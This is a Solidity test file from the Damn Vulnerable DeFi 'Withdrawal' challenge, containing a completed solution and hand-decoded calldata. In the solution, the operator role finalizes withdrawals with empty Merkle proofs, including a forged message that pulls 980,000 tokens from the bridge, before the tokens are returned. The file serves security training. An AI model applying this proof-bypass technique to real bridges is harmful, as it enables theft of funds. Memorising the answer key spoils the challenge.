// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // forward a message to withdraw funds first
        bytes memory message = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (player, 980000 ether));

        l1Gateway.finalizeWithdrawal(
            0,
            address(l2Handler),
            address(l1Forwarder),
            0,
            abi.encodeCall(L1Forwarder.forwardMessage, (0, address(0), address(l1TokenBridge), message)),
            new bytes32[](0)
        );

        skip(8 days);

        // finalize withdrawals without proofs
        l1Gateway.finalizeWithdrawal(
            0,
            l2Handler,
            address(l1Forwarder),
            0x0000000000000000000000000000000000000000000000000000000066729b63,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );
        l1Gateway.finalizeWithdrawal(
            1,
            l2Handler,
            address(l1Forwarder),
            0x0000000000000000000000000000000000000000000000000000000066729b95,
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );
        l1Gateway.finalizeWithdrawal(
            2,
            l2Handler,
            address(l1Forwarder),
            0x0000000000000000000000000000000000000000000000000000000066729bea,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );
        l1Gateway.finalizeWithdrawal(
            3,
            l2Handler,
            address(l1Forwarder),
            0x0000000000000000000000000000000000000000000000000000000066729c37,
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
            new bytes32[](0)
        );

        // transfer tokens back to the bridge
        token.transfer(address(l1TokenBridge), token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}

/*
eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
0000000000000000000000000000000000000000000000000000000000000060 // data.offset
0000000000000000000000000000000000000000000000000000000000000104 // data.length
01210a38                                                         // L1Forwarder.forwardMessage.selector
0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // sender (l2Sender)
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
0000000000000000000000000000000000000000000000000000000000000080 // message.offset
0000000000000000000000000000000000000000000000000000000000000044 // message.length
81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
0000000000000000000000000000000000000000000000008ac7230489e80000 // amount
        00000000000000000000000000000000000000000000000000000000 // padding 1
        00000000000000000000000000000000000000000000000000000000 // padding 2
*/

/*
0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60
0000000000000000000000000000000000000000000000000000000066729b95
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000104
01210a38
0000000000000000000000000000000000000000000000000000000000000001
0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50
0000000000000000000000000000000000000000000000000000000000000080
0000000000000000000000000000000000000000000000000000000000000044
81191e51
0000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e
0000000000000000000000000000000000000000000000008ac7230489e80000
        00000000000000000000000000000000000000000000000000000000
        00000000000000000000000000000000000000000000000000000000
*/

/*
baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015
0000000000000000000000000000000000000000000000000000000066729bea
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000104
01210a38
0000000000000000000000000000000000000000000000000000000000000002
000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50
0000000000000000000000000000000000000000000000000000000000000080
0000000000000000000000000000000000000000000000000000000000000044
81191e51
000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e0
00000000000000000000000000000000000000000000d38be6051f27c2600000
        00000000000000000000000000000000000000000000000000000000
        00000000000000000000000000000000000000000000000000000000
*/

/*
9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09
0000000000000000000000000000000000000000000000000000000066729c37
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000104
01210a38
0000000000000000000000000000000000000000000000000000000000000003
000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50
0000000000000000000000000000000000000000000000000000000000000080
0000000000000000000000000000000000000000000000000000000000000044
81191e51
000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b
0000000000000000000000000000000000000000000000008ac7230489e80000
        00000000000000000000000000000000000000000000000000000000
        00000000000000000000000000000000000000000000000000000000
*/
